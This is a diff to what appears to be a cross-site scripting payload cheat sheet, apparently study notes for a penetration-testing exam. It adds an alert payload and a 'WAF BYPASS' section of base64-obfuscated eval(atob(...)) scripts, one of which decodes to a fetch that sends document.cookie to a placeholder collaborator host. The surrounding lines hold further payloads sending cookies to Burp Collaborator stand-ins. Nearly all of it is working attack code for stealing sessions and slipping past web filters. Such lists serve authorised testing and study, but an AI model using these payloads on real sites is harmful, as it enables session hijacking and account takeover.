@@ -65,6 +65,7 @@ Repeat the same procedure with the target victim
 \' - alert(1) -'
 \' - alert(1) //
 ' + alert(1) + '
+\"-alert(1)}//
 javascript:alert(0)
 ${alert(0)}
 <svg><animateTransform onbegin=alert(1)>
@@ -166,7 +167,6 @@ ${document.location='https://<BURP-COLLAB>/?cookies'+document.cookie;}
 // adapt the payload in the exam depending of the parser
 \"-fetch('https://<COLLABORATOR>?cookie='+btoa(document.cookie))}//
 
-
 // in comments
 <script>
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
@@ -175,6 +175,16 @@ mode: 'no-cors',
 body:document.cookie
 });
 </script>
+
+
+
+// WAF BYPASS
+<script>eval(atob('YWxlcnQoMSk='));</script>  // POC alert(1)
+<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQo='));</script> // POC alert(document.cookie)
+// CHANGE B64 FOR EACH SNIPPET TO STEAL COOKIE
+<script>eval(atob("ZmV0Y2goJ2h0dHBzOi8vPEVWRU5UPi8/Yz0nK2J0b2EoZG9jdW1lbnQuY29va2llKSk="))</script>
+
+<script>document.location="http://<IP>/?cookie="+eval(atob("ZmV0Y2goJ2h0dHBzOi8vPEVWRU5UPi8/Yz0nK2J0b2EoZG9jdW1lbnQuY29va2llKSk="))"</script>
 
 ```
 
